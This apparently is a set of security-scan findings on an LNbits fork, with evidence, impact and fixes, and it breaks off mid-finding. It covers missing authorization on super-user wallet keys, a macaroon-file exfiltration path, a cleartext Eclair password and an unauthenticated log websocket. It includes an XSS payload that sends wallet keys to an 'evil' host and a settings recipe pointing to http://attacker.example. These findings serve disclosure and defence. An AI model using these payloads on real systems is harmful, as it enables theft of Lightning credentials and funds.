Scope: admins reading *ordinary* users' wallet keys is the documented 'manage users and wallets' role (docs/guide/super_user.md table) and is what the users UI copy buttons do, so this record is limited to the super-user target, where the file's own write-side checks and the roles documentation (funding, credit/debit, 'final authority' are owner-only) establish the boundary. Viewing payments is conceded to admins ('View all Payments' ✓), so the new confidentiality gain is the wallet credentials themselves; the integrity gain is spending the owner's funds.

## Evidence
1. [lnbits/core/views/user\_api.py:77–90](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L77-L90)
   GET /users/api/v1/user/{user_id} (router-level check_admin only) returns the User with wallets via copy_with_keys(keep=can_write); for any session login can_write is True, so adminkey/inkey are returned. No check excludes user_id == settings.super_user.
2. [lnbits/core/views/user\_api.py:272–278](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L272-L278)
   GET /users/api/v1/user/{user_id}/wallet returns all wallets (including deleted) with keys for any user id, again without a super-user exclusion.
3. [lnbits/core/views/user\_api.py:135–139](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L135-L139)
   The sibling write routes explicitly block non-super admins from acting on the super user (also 171-175, 242-246, 354-358, 386-390), showing the intended boundary that the read routes do not enforce.
4. [lnbits/decorators.py:403–419](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L403-L419)
   check_api_write_access returns True for any non-ACL session token, so the keys are not masked for an admin's ordinary login.
5. [lnbits/core/models/wallets.py:147–153](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L147-L153)
   copy_with_keys only masks credentials when keep is False.
6. [lnbits/core/models/users.py:196–197](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L196-L197)
   Account serialises is_super_user/is_admin (no_database fields still appear in responses), so GET /users/api/v1/user (Page[AccountOverview]) tells the admin which id is the super user.

## Impact
Discloses the super user's wallet credentials (admin and invoice keys of every wallet, including deleted ones) and lets the admin spend the super user's balance to attacker-controlled invoices, create wallets on the super user's account, undelete their wallets and set their lightning address — control over the owner's funds that the write routes and roles docs reserve to the super user. Payment history is already conceded to admins, so confidentiality impact rests on the credentials. No availability effect.

## Reproduction steps
1. Attacker is any non-super admin with a password session (PR:HIGH, check_admin). Two GET requests over the network followed by one POST /api/v1/payments with the stolen admin key; no victim interaction, no defence to defeat, default configuration (users router always mounted, check_api_write_access returns True for session tokens).

## Recommended fix
The read and wallet-management routes of the users API do not apply the super-user exclusion that the write routes in the same router enforce, so a non-super admin can retrieve the super user's wallet credentials and act on their wallets. Fix criteria: Requests targeting settings.super_user through GET /users/api/v1/user/{id}, GET .../wallet, POST .../wallet, PUT .../undelete and PUT .../lightning-address are refused unless the caller is the super user (or at minimum return wallets with keys masked). Verify: a non-super admin's GET for the super user's wallets returns 403 or masked keys, and the super user's adminkey is never present in a non-super admin response.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257418

---

# Admin-editable macaroon setting reads any *.macaroon file and sends it to admin-chosen host

## Details
load_macaroon() (lnbits/wallets/macaroon/macaroon.py:28-31) decides that a macaroon setting is a *file path* purely from its suffix: `if macaroon.split('.')[-1] == 'macaroon': open(macaroon,'rb').read().hex()`. There is no allowed directory and no check that the file is the one the operator configured. The value comes from EditableSettings fields (lnd_rest_macaroon, lnd_admin_macaroon, lnd_rest_admin_macaroon, lnd_invoice_macaroon, lnd_rest_invoice_macaroon, lnd_grpc_macaroon, lnd_grpc_admin_macaroon, lnd_grpc_invoice_macaroon, corelightning_rest_macaroon) which any admin account (not only the super user) can write through PUT/PATCH /admin/api/v1/settings: api_update_settings (core/views/admin_api.py:107-121) gates only lnbits_allow_onchain_payments and the 2FA policy behind is_super_user; every funding-source field, lnbits_backend_wallet_class included, is persisted via update_admin_settings with no role check and no enforcement of the read-only lnbits_allowed_funding_sources list (enforced in the Vue UI only). docs/guide/super_user.md explicitly reserves 'Change funding source' to the Super User ('the SU is the one trusted with funding source control'), so this is not a conceded admin capability.

The read is not merely local. On the next process start, check_admin_settings() (core/services/users.py:166-178, runs whenever lnbits_admin_ui is true, the default) copies the DB-stored settings over the env values, then set_funding_source() constructs the configured backend and check_funding_source() immediately calls status() (app.py:111-118). LndRestWallet (lndrest.py:92-113) puts the file's hex into the `Grpc-Metadata-macaroon` header of an httpx client whose base_url is the admin-editable lnd_rest_endpoint; normalize_endpoint (helpers.py:345-353) keeps an `http://` prefix as given, so no certificate is needed. CoreLightningRestWallet (corelightningrest.py:39-66) sends it as the `macaroon` header to corelightning_rest_url with verify=False by default. LndWallet (lndgrpc.py:108-134) sends it as gRPC call metadata to lnd_grpc_endpoint:lnd_grpc_port with the trust root taken from whatever PEM file lnd_grpc_cert names (e.g. the system CA bundle). The first status() request therefore delivers the file bytes to the admin-chosen host.

Consequence: an LNbits admin who was deliberately given only a limited credential (LNbits configured with an invoice macaroon or an inline hex macaroon, or a hosted backend with no node access) can set lnbits_backend_wallet_class=LndRestWallet, lnd_rest_macaroon=/path/to/.lnd/data/chain/bitcoin/mainnet/admin.macaroon (or any other *.macaroon the LNbits process can read: loop/pool/boltz macaroons, c-lightning-REST access.macaroon) and lnd_rest_endpoint=http://attacker.example, and receive that credential in a request header after the next restart. The super user's intent to restrict LNbits and its admins to a specific credential is defeated; with the node's admin macaroon the attacker controls node funds directly, outside LNbits' ledger. The read is limited to files whose name ends in `.macaroon`, so this is not a generic file read, but every file of that name is a Lightning credential.

The attack needs a process restart to re-run set_funding_source(); /admin/api/v1/restart is super-user only, so a non-super admin must wait for an operator, upgrade or container restart (attack_requirements PRESENT). The finding holds only where a .macaroon file other than the configured credential is readable by the LNbits process (same host as the node, or a mounted node data directory); where the configured credential already is the node admin macaroon the gain reduces to the credential disclosure recorded elsewhere. This records the backend-side file-read-and-exfiltration consequence distinct from the generic settings-authorization gap (admin-settings-put-missing-super-user-check-funding-sso-admin-fields).

## Evidence
1. [lnbits/wallets/macaroon/macaroon.py:27–31](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/macaroon/macaroon.py#L27-L31)
   load_macaroon treats any setting string whose last dot-component is 'macaroon' as a filesystem path, opens it with no base-directory restriction or check against the operator-configured credential, and returns the raw bytes as hex.
2. [lnbits/core/views/admin\_api.py:107–133](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L107-L133)
   api_update_settings accepts every EditableSettings field from any check_admin account; the only is_super_user gates are lnbits_allow_onchain_payments and the 2FA policy, so funding-source class, endpoint, cert and macaroon fields are persisted via update_admin_settings for a non-super admin.
3. [lnbits/wallets/lndrest.py:92–113](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/lndrest.py#L92-L113)
   LndRestWallet.__init__ feeds the admin-editable lnd_rest_macaroon/lnd_admin_macaroon/... settings into load_macaroon and puts the resulting hex into the Grpc-Metadata-macaroon header of an httpx client whose base_url is the admin-editable lnd_rest_endpoint; the first status() request transmits it.
4. [lnbits/core/services/users.py:166–178](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L166-L178)
   check_admin_settings loads the DB-stored settings and applies them with update_cached_settings at startup (lnbits_admin_ui defaults to True), so the admin-written macaroon path and endpoint are the values in effect when set_funding_source() runs.
5. [lnbits/app.py:111–118](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L111-L118)
   set_funding_source() instantiates the configured backend at startup and check_funding_source() immediately calls status(), which is the request that carries the macaroon header to the configured endpoint.
6. [lnbits/wallets/corelightningrest.py:39–66](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L39-L66)
   CoreLightningRestWallet does the same with corelightning_rest_macaroon -> 'macaroon' header, sent to corelightning_rest_url with TLS verification disabled by default (verify=False), so no certificate is needed on the receiving host.
7. [lnbits/wallets/lndgrpc.py:108–134](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/lndgrpc.py#L108-L134)
   LndWallet loads lnd_grpc_macaroon via load_macaroon and sends it as gRPC call metadata to lnd_grpc_endpoint:lnd_grpc_port, trusting whatever PEM file lnd_grpc_cert points at as root of trust.
8. [lnbits/helpers.py:345–353](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/helpers.py#L345-L353)
   normalize_endpoint returns an endpoint beginning with http:// unchanged, so the LndRest exfiltration request can be sent in cleartext to the attacker's host without any certificate.
9. [lnbits/settings.py:587–609](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L587-L609)
   All macaroon/endpoint/cert fields are plain EditableSettings fields (FundingSourcesSettings is mixed into EditableSettings), hence writable through the admin settings API and overridden from the DB at startup.

## Impact
Confidentiality: any .macaroon credential readable by the process is disclosed, including node admin macaroons the super user intentionally withheld from LNbits and its admins. Integrity/availability of LNbits itself are not directly affected by the read; redirecting the funding source is the separately recorded authorization gap. Subsequent-system impact: When the disclosed file is a node admin macaroon (the documented layout places it beside the invoice macaroon, and container deployments commonly mount the node data directory), the attacker gains full control of the operator's Lightning node: spend channel funds, withdraw on-chain, close channels. This crosses from LNbits into the node, which the threat model treats as the money source of truth.

## Reproduction steps
1. Attacker is an authenticated LNbits admin who is not the super user, a role docs/guide/super_user.md says is not trusted with funding-source control. Via PUT or PATCH /admin/api/v1/settings (only onchain-payments and 2FA fields are super-user gated) they set lnbits_backend_wallet_class=LndRestWallet, lnd_rest_macaroon to the path of any .macaroon file readable by the LNbits process, and lnd_rest_endpoint to http://<attacker host> (normalize_endpoint keeps http://; CoreLightningRestWallet alternatively uses verify=False). On the next LNbits start the DB settings are loaded, the backend constructor reads the file and status() sends its hex in a header to the attacker's host. Requires a restart the admin cannot trigger (restart endpoint is super-user only) and a macaroon file other than the configured one readable by the process.

## Recommended fix
1. load_macaroon interprets a runtime-editable string as an unrestricted filesystem path, so configuration authority becomes file-read authority over credential files. Fix criteria: A macaroon setting may only resolve to a file when the value was supplied through the read-only environment, or when the resolved path lies inside an operator-configured credentials directory; runtime (DB) settings must only accept inline hex/base64. Verify by setting a .macaroon path via the admin API and confirming the backend refuses to read it after restart.
2. Funding-source credential and endpoint fields are editable by every admin, letting one party redirect credentials to a host they control. Fix criteria: Changing funding-source class, endpoints, certificates and credentials requires super-user privilege (tracked in admin-settings-put-missing-super-user-check-funding-sso-admin-fields); after the fix a non-super admin's PUT with these fields is rejected.

---
**Severity:** HIGH
**Status:** Open
**Category:** Path traversal
**CWE:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257417

---

# Eclair paid-invoice stream always uses plaintext ws:// and sends API password in Basic auth

## Details
EclairWallet derives its WebSocket URL as `f"ws://{urllib.parse.urlsplit(self.url).netloc}/ws"` (lnbits/wallets/eclair.py:48). The scheme is hard-coded to `ws://`; there is no `wss://` branch even when the REST endpoint is `https://`. The same constructor base64-encodes the Eclair API password into an HTTP Basic `Authorization` header (:50-56), and `paid_invoices_stream` (:310-315) sends that header in the WebSocket handshake on every connect, retrying every 5 seconds for as long as LNbits runs (:323-328).

`normalize_endpoint` (lnbits/helpers.py:345-353) preserves an `https://` scheme and, for a schemeless host such as `eclair.example.com:8283`, prepends `https://` — so the REST client is encrypted while the WebSocket to the same netloc is plaintext. The project's own sibling backends do this correctly: phoenixd.py:52-61 selects `wss` for an `https` endpoint with the identical `:password` Basic-auth header, bark.py:50 likewise, lnbits.py:44 rewrites `https`→`wss`. Eclair is the single outlier.

Result: an operator who exposes a remote Eclair API behind TLS (ACINQ's API has no native TLS, so a TLS reverse proxy is the documented way to expose it off-host) still has LNbits transmit the node password in cleartext toward that host, at startup and every 5 s after each failure. The `websockets` 15.0.1 client (pyproject pins `websockets~=15.0.1`) writes the full HTTP upgrade request, including `Authorization`, as soon as the TCP connection is established and before reading any response; a passive on-path observer therefore captures the credential whenever anything accepts the TCP connection on the plaintext port (e.g. a proxy's port-80 redirect listener, or the TLS port itself, which will merely reject the plaintext bytes after they are on the wire), and an active on-path attacker can accept the connection even when nothing listens. Eclair's API has one password that authorises every endpoint (payinvoice, sendonchain, open/close channels), so possession equals full control of the node's funds that back every LNbits balance.

The stream is also where LNbits learns of `payment-received` events (:320-321), but the core re-verifies via `check_payment_status` over the REST client before crediting (lnbits/core/services/payments.py:1320-1331), so injection on the stream alone does not credit a wallet; an active attacker can only suppress or delay notifications.

When `eclair_url` is `http://127.0.0.1:8283` (the documented example) everything is plaintext by explicit operator choice to loopback; this finding is the https / remote case, where the operator's chosen encrypted transport is silently downgraded for the WebSocket and the admin UI (lnbits-admin-funding-sources.js:139) offers `eclair_url` as a free URL field with no loopback restriction. The fix is scheme-aware ws/wss selection as in phoenixd.py.

## Evidence
1. [lnbits/wallets/eclair.py:47–57](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/eclair.py#L47-L57)
   ws_url is built as f"ws://{netloc}/ws" (:48) regardless of whether self.url is https://; the Authorization header built at :50-56 holds base64(':'+eclair_pass), the Eclair API password in reversible form, and is shared by the REST client and the WebSocket handshake.
2. [lnbits/wallets/eclair.py:307–328](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/eclair.py#L307-L328)
   paid_invoices_stream connects to ws_url with that Authorization header as an additional handshake header (:310-315) and on any exception sleeps 5 s and reconnects for the lifetime of the process (:323-328), so the password is re-sent in cleartext on every attempt.
3. [lnbits/helpers.py:345–353](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/helpers.py#L345-L353)
   normalize_endpoint preserves an https:// scheme and prepends https:// to a schemeless host (:349-351), so the REST client to the same netloc is TLS-protected while the WebSocket is not; the project's own default transport for a remote endpoint is encrypted.
4. [lnbits/wallets/phoenixd.py:52–61](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/phoenixd.py#L52-L61)
   The sibling Phoenixd backend, with the identical ':password' Basic-auth header pattern, selects ws/wss from the endpoint scheme and rejects anything else — the project's intended pattern that eclair.py:48 omits (bark.py:50 and lnbits.py:44 do the same).
5. [lnbits/core/services/payments.py:1309–1331](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1309-L1331)
   update_invoice_from_paid_invoices_stream re-checks each streamed checking_id via check_payment_status over the REST client before marking SUCCESS, so a plaintext-stream attacker cannot credit wallets by injection; the stream's exposure is confidentiality of the credential plus notification suppression.

## Impact
Confidentiality: the sole backend credential (Eclair API password) is disclosed. LNbits' ledger integrity is not directly altered because streamed paid events are re-verified via check_payment_status over REST (payments.py:1320); an active attacker can disrupt the invoice-notification stream (availability LOW). Subsequent-system impact: The Eclair password authorises every API call on the operator's node: paying arbitrary invoices, on-chain sends, closing channels. The attacker thereby controls the node's funds, which back every LNbits balance.

## Reproduction steps
1. Attacker on the network path between LNbits and a remotely reachable Eclair API configured with an https (or schemeless, defaulted to https) eclair_url. LNbits itself initiates the ws:// connection carrying 'Authorization: Basic base64(:password)' at startup and every 5 s after a drop; websockets 15.0.1 writes the handshake request before reading any response, so a passive capture suffices when the plaintext port accepts the TCP connection, and an active on-path attacker can accept it regardless. No LNbits privileges or user interaction; the on-path position (AT:P) is the single requirement.

## Recommended fix
1. The WebSocket URL scheme is hard-coded to ws://, discarding the transport security the operator selected (or normalize_endpoint defaulted to) with an https REST URL, while the handshake carries a reversible credential. Fix criteria: The WebSocket must use wss:// (with certificate verification) whenever the normalized REST URL is https://, mirroring phoenixd.py's scheme selection; verify that with an https eclair_url no ws:// connection attempt is made and the Authorization header never leaves the host unencrypted.
2. A non-loopback plaintext Eclair endpoint is accepted silently, so a misconfiguration that exposes the node password is never surfaced to the operator. Fix criteria: Refuse, or log a prominent warning for, an eclair_url whose resolved transport is plaintext to a non-loopback host; verify the warning/refusal fires for http://remote-host and not for http://127.0.0.1.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cleartext transmission
**CWE:** [CWE-319](https://cwe.mitre.org/data/definitions/319.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257415

---

# Live server-log websocket readable with only the super-user id, no authentication

## Details
The admin UI's "server logs" panel is fed by a loguru sink (lnbits/utils/logger.py:42-54) that forwards every log record to the generic pub/sub channel `/api/v1/ws/<sha256(settings.super_user)>`. The websocket route (core/views/websocket_api.py:15-18) carries no authentication and connect() (core/services/websockets.py:21-30) accepts unconditionally, so the only thing between a client and a real-time feed of the whole server log is knowledge of the super-user account id.

The project explicitly does not treat that id as a credential: id-only access is disabled by default (settings.py:944-948) and, even when enabled, is refused for admin/super-user accounts (decorators.py:330-334; auth_api.py:194-197); docs/guide/super_user.md says 'User-ID logins are disabled for SU and admin roles' and 'Credentialed login is required'. This path hands a super-user-only capability to anyone holding the bare id, around the JWT session and 2FA controls. The id is moreover available to every non-super admin: GET /users/api/v1/user (user_api.py:66-74, check_admin) lists all accounts including the super user's `id` (get_accounts applies no exclusion), so an ordinary admin can cross the admin -> super-user boundary and read a feed the UI only shows to the super user. Outside that route the id also appears in `.super_user`, `lnbits-cli superuser` output, `?usr=` share/webmanifest URLs and browser history.

The sink has no level filter (loguru 0.7.3 `add()` defaults to DEBUG), so the stream carries DEBUG records regardless of `settings.debug`. In this scope alone: the wallet UI subscribes with each wallet's invoice key (lnbits-manage-wallet-list.js:73) and websockets.py:22 logs `Websocket connected to <inkey>` at DEBUG, so every open wallet leaks its invoice key (read access to balance and payment history, invoice creation); websockets.py:36 logs the full text of every frame any client sends; uvicorn access/error logs are intercepted into loguru at INFO (logger.py:79-82) and carry request paths with query strings; payments.py:1077/1096 log funding-backend responses (including payment preimages) and nwc.py logs relay traffic at DEBUG. No audit trail records who is listening, since the `Websocket connected` line is itself only visible in the same stream.

Root cause: a security-sensitive data feed is published on an anonymous broadcast channel whose only protection is an unsalted hash of a long-lived identifier the project itself declares insufficient for authentication, instead of being gated by the super-user session the UI already holds.

## Evidence
1. [lnbits/utils/logger.py:42–54](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/logger.py#L42-L54)
   initialize_server_websocket_logger derives the channel id as sha256(settings.super_user) and adds a loguru sink with no `level` argument (loguru 0.7.3 defaults add() to DEBUG), so every record including DEBUG is queued and forwarded via websocket_updater to that channel. Nothing but knowledge of the super-user id gates the stream: no session, JWT, password or 2FA is consulted.
2. [lnbits/core/views/websocket\_api.py:15–18](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/websocket_api.py#L15-L18)
   The /api/v1/ws/{item_id} websocket route has no dependency or check; any anonymous client supplying the right item_id is subscribed. The router is mounted unconditionally in core/__init__.py:49.
3. [lnbits/core/services/websockets.py:21–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/websockets.py#L21-L30)
   connect() accepts the socket unconditionally and registers it under item_id; send() later delivers every message to all connections registered for that id. Line 22 also logs `Websocket connected to {item_id}` at DEBUG, so every channel id any client subscribes with is itself fed into the stream.
4. [lnbits/decorators.py:330–334](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L330-L334)
   Shipped control: even when the user-id-only auth method is enabled, `?usr=` access for an admin/super-user account raises 403 'User id only access for admins is forbidden.' The project therefore does not treat the super-user id as a credential; the websocket log channel contradicts this by granting a super-user-only capability on the id alone.
5. [lnbits/core/views/auth\_api.py:185–197](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L185-L197)
   POST /api/v1/auth/usr refuses login by user id for admin accounts ('Admin users cannot login with user id only.'), and the method is disabled by default (settings.py:944-948). docs/guide/super_user.md states 'User-ID logins are disabled for SU and admin roles' and 'SU secrecy: Regular users and admins cannot discover the SU user ID'.
6. [lnbits/core/views/user\_api.py:66–73](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L66-L73)
   Concrete acquisition route for a non-super admin: GET /users/api/v1/user (check_admin only) returns Page[AccountOverview] from get_accounts (crud/users.py:87-140), which selects accounts.id for every account with no exclusion of the super user. An admin can read the SU id, hash it and open the log websocket, crossing the admin -> super-user boundary.
7. [lnbits/static/js/components/lnbits-manage-wallet-list.js:73](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-manage-wallet-list.js#L73)
   The wallet UI subscribes to `/api/v1/ws/${wallet.inkey}` for every wallet it displays, so websockets.py:22 writes each open wallet's invoice key into the DEBUG stream the attacker is reading.
8. [lnbits/core/services/websockets.py:32–36](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/websockets.py#L32-L36)
   listen() logs at DEBUG the full text of every frame any websocket client sends, keyed by channel id; this too is forwarded to the log channel.
9. [lnbits/app.py:621–626](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L621-L626)
   The sink and its forwarding task are installed whenever settings.lnbits_admin_ui is true (default True, settings.py:1332), so this is the shipped default configuration.
10. [lnbits/static/js/components/admin/lnbits-admin-security.js:105–117](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/admin/lnbits-admin-security.js#L105-L117)
   The admin UI's server-log panel derives the channel client-side as sha256(user.id) and opens the same unauthenticated websocket, confirming that possession of the super-user id is the only thing the stream is keyed on; a non-super admin's own id yields nothing, i.e. the feed is intended to be super-user-only.

## Impact
Real-time DEBUG-level server log of a wallet service: invoice keys of every wallet with an open UI session (read access to all those users' balances and payment histories), every websocket frame from every client, request paths with query strings, funding-backend responses including preimages, and whatever any module prints at DEBUG. Confidentiality HIGH across all users and the operator. The path itself only reads; no direct integrity or availability impact.

## Reproduction steps
1. Network-reachable on the shipped default (admin UI on). Attacker needs the super-user id — obtained by any non-super admin from GET /users/api/v1/user, or by anyone from a leaked `?usr=` URL, CLI output, backup or the `.super_user` file — computes sha256(id) and opens `wss://host/api/v1/ws/<hash>`; the server accepts without credential and streams every record thereafter. No account is required on the anonymous route (PR:N), the id is the one precondition (AT:P), no user interaction. Assumptions on pinned dependencies: loguru 0.7.3 `logger.add()` defaults to level DEBUG when none is given; uvicorn 0.40.0 `Config(access_log=True)` by default, with access/error loggers intercepted at logger.py:79-82.

## Recommended fix
1. The server-log stream is published on an unauthenticated broadcast channel keyed only by a hash of the super-user id, which the project itself does not accept as a credential. Fix criteria: Log streaming requires an authenticated super-user session validated server-side at websocket accept time (cookie/JWT, honouring 2FA) rather than a derivable channel id; an anonymous client or non-super admin presenting sha256(super_user) receives nothing.
2. The websocket log sink has no level filter and forwards DEBUG records independent of settings.debug. Fix criteria: The sink honours the configured log level (INFO unless debug is enabled) so DEBUG payloads such as websocket channel ids (invoice keys), frame contents and backend responses are not broadcast.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing authentication
**CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257408

---

# Invoice-key holder plants javascript: URL in payment extra, rendered as QR link in owner's wallet

## Details
The shared `lnbits-qrcode` component wraps the QR image in an anchor bound to its `href` prop (lnbits-qrcode.vue:7-12) and its click handler `clickQrCode` (lnbits-qrcode.js:82-92) neutralises only two cases: an empty href (copy to clipboard) and an href beginning with `http` (window.open). Any other value is left to the browser's default anchor activation, so a `javascript:` URL executes in the LNbits document when the QR code is clicked. Vue 3.5.44 (package.json) binds `:href` verbatim and performs no URL-scheme sanitisation; no CSP is set on core pages.

`lnbits-payment-list.vue:463-474` feeds this component with `props.row.extra.fiat_payment_request` for every pending incoming payment that has a bolt11, inside the per-row details dialog the owner opens by clicking the row. That value is not produced only by fiat providers: `POST /api/v1/payments` (payment_api.py:280-331) accepts the wallet's *invoice* key (`require_base_invoice_key`) and a free-form `extra: dict` in `CreateInvoice` (models/payments.py:289-305, no key allow-list). For `out=false` without `fiat_provider` the dict flows unchanged through `create_payment_request` -> `create_wallet_invoice` (`extra=data.extra`, services/payments.py:257-270) -> `create_invoice` -> `calculate_fiat_amounts` (which only adds keys, 658-694) -> `CreatePayment(extra=extra)` -> `create_payment` (crud/payments.py:261-283), which persists it with `db.insert` — a path that does not run the HTML-stripping `rewrite_values` (and the payload needs no `<` or `&` anyway). The server itself treats the key as authoritative (`Payment.__init__` copies `extra['fiat_payment_request']` into `payment_request`), and `GET /api/v1/payments/paginated` returns it to the wallet UI, where `lnbits-payment-list.js:170` copies `extra` onto the row.

Attack: an invoice-key holder (the invoice key is receive-only by design and is embedded in public pages, LNURL-pay apps, point-of-sale devices, and handed to shared-wallet grantees) calls

    POST /api/v1/payments  X-Api-Key: <victim inkey>
    {"out": false, "amount": 1, "memo": "refund", "extra": {"fiat_payment_request": "javascript:fetch('https://evil/'+JSON.stringify(g.user.wallets))"}}

A real bolt11 invoice is created on the funding source and a pending incoming payment appears in the owner's wallet (the list refreshes on the websocket `g.updatePayments` toggle). When the owner opens the payment's detail dialog, the QR code is rendered with `href="javascript:..."` (the QR itself encodes the same string, so it looks like an odd fiat checkout link; the tooltip/title shows the raw href); clicking the QR runs the script in the owner's authenticated session on the LNbits origin. `window.g.user` holds the adminkey and inkey of every wallet the owner has, and same-origin fetches carry the session cookie, so the attacker escalates from a receive-only key to full spend/API control of all the victim's wallets and account (and to admin settings if the owner is an admin). The same component is also embedded in the admin users page (users.vue:16), so an admin inspecting the wallet is exposed too.

Assumption: Vue 3.5.44 does not sanitise `javascript:` URLs in attribute bindings (Vue's own security guide documents that URL sanitisation is left to the application).

The root defect is in the shared component: `href` is bound without restricting it to safe schemes (http(s), lightning:, lnurl:, bitcoin:), and the payment list binds a creator-controlled field into it.

## Evidence
1. [lnbits/static/js/components/lnbits-qrcode.js:82–91](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-qrcode.js#L82-L91)
   clickQrCode only intercepts href === '' (copy to clipboard, preventDefault) and href starting with 'http' (window.open, preventDefault). Any other scheme, including javascript:, falls through without preventDefault, so the anchor's default activation navigates to the URL and the browser executes it in the current document.
